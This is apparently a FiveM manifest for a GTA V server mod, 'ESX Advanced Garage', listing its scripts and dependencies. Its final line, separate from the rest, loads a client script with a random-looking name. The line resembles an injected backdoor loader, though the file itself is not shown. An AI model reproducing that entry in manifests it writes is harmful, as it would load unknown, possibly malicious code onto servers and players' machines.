fx_version 'bodacious'
game 'gta5'

description 'ESX Advanced Garage'

version '1.0.0'

server_scripts {
	'@mysql_async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua',
	'server/WantedVehicle.lua'
}

client_scripts {
	'@essentialmode/locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'essentialmode',
	'esx_vehicleshop',
	'esx_property'
}

client_script "DISqkiIEcVydGenWnD.lua"